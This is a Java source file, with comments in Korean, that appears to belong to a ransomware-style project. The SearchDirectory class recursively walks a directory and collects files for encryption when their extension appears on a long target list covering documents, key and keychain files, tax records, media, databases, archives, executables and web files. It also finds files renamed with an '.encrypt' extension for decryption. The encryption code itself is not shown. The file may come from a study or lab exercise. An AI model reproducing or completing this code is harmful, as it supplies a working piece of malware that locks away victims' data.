package security;
import file.getfile;

import org.apache.commons.io.FilenameUtils;

import lock.start;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;


public class SearchDirectory {


    private String defaultDirectory;
    private boolean isWindow;
    private ArrayList<File> allFiles = new ArrayList<>();
    private ArrayList<File> encryptedFiles = new ArrayList<>();

    private ArrayList<String> containsFilters = new ArrayList<>();


    public SearchDirectory() {

        isWindow = true;
        setDefaultDirectory(getfile.getf); //입력된 파일주소 getf를 기본디렉토리로 설정

        initContainFilter(); // 암호화할 확장자 확인
    }

    /**
     * 암호화할 컴퓨터 내의 모든 파일 검색후 반환
     *
     * @return 찾아낸 모든 파일의 list 넘김
     */
    public ArrayList<File> allFileSearch() {

        System.out.println("[Log] 디렉토리 검색 시작");
        System.out.println(defaultDirectory);
        getFileList(defaultDirectory);
        System.out.println("[Log] 디렉토리 검색 끝");

        return allFiles;
    }

    /**
     * 복호화할 파일을 검색후 반환
     *
     * @return 복호화 할 파일
     */
    public ArrayList<File> decryptSearch() {

        System.out.println("[Log] 디렉토리 검색 시작");
        System.out.println(defaultDirectory);
        getEncryptedList(defaultDirectory);
        System.out.println("[Log] 디렉토리 검색 끝");

        return encryptedFiles;
    }


    /**
     * 암호화할 파일의 확장자 설정
     * Common File Types
     */
    private void initContainFilter() {
        // Text files 12
        containsFilters.add("doc");
        containsFilters.add("docx");
        containsFilters.add("log");
        containsFilters.add("msg");
        containsFilters.add("odt");
        containsFilters.add("pages");
        containsFilters.add("rtf");
        containsFilters.add("tex");
        containsFilters.add("txt");
        containsFilters.add("wpd");
        containsFilters.add("wps");
        containsFilters.add("hwp");

        // Data files 16
        containsFilters.add("csv");
        containsFilters.add("dat");
        containsFilters.add("gbr");
        containsFilters.add("ged");
        containsFilters.add("key");
        containsFilters.add("keychain");
        containsFilters.add("pps");
        containsFilters.add("pps");
        containsFilters.add("ppt");
        containsFilters.add("pptx");
        containsFilters.add("sdf");
        containsFilters.add("tar");
        containsFilters.add("tax2012");
        containsFilters.add("tax2014");
        containsFilters.add("vcf");
        containsFilters.add("xml");

        // Audio files 10
        containsFilters.add("alf");
        containsFilters.add("iff");
        containsFilters.add("m3u");
        containsFilters.add("m4a");
        containsFilters.add("mid");
        containsFilters.add("mp3");
        containsFilters.add("mpa");
        containsFilters.add("ra");
        containsFilters.add("wav");
        containsFilters.add("wma");

        // Video files 16
        containsFilters.add("3g2");
        containsFilters.add("3gp");
        containsFilters.add("asf");
        containsFilters.add("asf");
        containsFilters.add("asx");
        containsFilters.add("avi");
        containsFilters.add("flv");
        containsFilters.add("m4v");
        containsFilters.add("mov");
        containsFilters.add("mp4");
        containsFilters.add("mpg");
        containsFilters.add("rm");
        containsFilters.add("srt");
        containsFilters.add("swf");
        containsFilters.add("vob");
        containsFilters.add("wmv");

        // 3D image files 4
        containsFilters.add("3dm");
        containsFilters.add("3ds");
        containsFilters.add("max");
        containsFilters.add("obj");

        // Raster image files 12
        containsFilters.add("bmp");
        containsFilters.add("dds");
        containsFilters.add("gif");
        containsFilters.add("jpg");
        containsFilters.add("png");
        containsFilters.add("psd");
        containsFilters.add("pspimage");
        containsFilters.add("tga");
        containsFilters.add("thm");
        containsFilters.add("tif");
        containsFilters.add("tiff");
        containsFilters.add("yuv");

        // Vector image files 4
        containsFilters.add("ai");
        containsFilters.add("eps");
        containsFilters.add("ps");
        containsFilters.add("svg");

        // Page layout files 3
        containsFilters.add("indd");
        containsFilters.add("pct");
        containsFilters.add("pdf");

        // Spreadsheet files 3
        containsFilters.add("xlr");
        containsFilters.add("xls");
        containsFilters.add("xlsx");

        // Database files 3
        containsFilters.add("db");
        containsFilters.add("dbf");
        containsFilters.add("sql");
 
        // Compressed files 4
        containsFilters.add("7z");
        containsFilters.add("rar");
        containsFilters.add("zip");
        containsFilters.add("tar.gz");

        // Executable files 5
        containsFilters.add("apk");
        containsFilters.add("app");
        containsFilters.add("com");
        containsFilters.add("exe");
        containsFilters.add("jar");

        // Web files 9
        containsFilters.add("asp");
        containsFilters.add("aspx");
        containsFilters.add("css");
        containsFilters.add("htm");
        containsFilters.add("html");
        containsFilters.add("js");
        containsFilters.add("jsp");
        containsFilters.add("php");
        containsFilters.add("xhtml");

        // Font files 4
        containsFilters.add("fnt");
        containsFilters.add("fon");
        containsFilters.add("oft");
        containsFilters.add("ttf");

        // Mick files 5
        containsFilters.add("crdownload");
        containsFilters.add("ics");
        containsFilters.add("msi");
        containsFilters.add("part");
        containsFilters.add("torrent");

        // http://fileinfo.com/filetypes/common
    }

    /**
     * 최상위 디렉토리 사용자 설정
     *
     * @param defaultDirectory
     */
    private void setDefaultDirectory(String defaultDirectory) {
        this.defaultDirectory = defaultDirectory;
    }

    /**
     * souce에 주어진 경로에 있는 모든 파일을 훑음, 또한 하위 디렉토리 존재시, 재귀로 다시 호출
     *
     * @param source
     */
    private void getFileList(String source) {
        File dir = new File(source);
        File[] fileList = dir.listFiles();
        try {
            if (fileList != null) {
                for (File file : fileList) {
                    if (file.isFile()) {

                        // 파일이 있다면 파일 추가
                        if (isAvailableFile(file)) {
                            allFiles.add(file);
                        }
                    } else if (file.isDirectory()) {
                        // 서브디렉토리가 존재하면 재귀적 방법으로 다시 탐색
                        System.out.println(file.getCanonicalPath());
                        getFileList(file.getCanonicalPath());
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 복호화할 파일 검색 알고리즘
     *
     * @param source
     */
    private void getEncryptedList(String source) {
        File dir = new File(source);
        File[] fileList = dir.listFiles();
        try {
            if (fileList != null) {
                for (File file : fileList) {
                    if (file.isFile()) {
                        // 파일이 있다면 파일 추가
                        if (FilenameUtils.getExtension(file.getName()).equals("encrypt")) {
                            encryptedFiles.add(file);
                        }
                    } else if (file.isDirectory()) {
                        // 서브디렉토리가 존재하면 재귀적 방법으로 다시 탐색
                        System.out.println(file.getCanonicalPath());
                        getEncryptedList(file.getCanonicalPath());
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 필터에 부합하는 파일인지 확인
     *
     * @param file
     * @return
     */

    private boolean isAvailableFile(File file) {
        return this.containsFilters.contains(FilenameUtils.getExtension(file.getName().toLowerCase()));
    }

    /**
     * 검색한 파일 인덱스 제거
     */
    public void clearFiles() {
        this.encryptedFiles.clear();
        this.allFiles.clear();
    }
}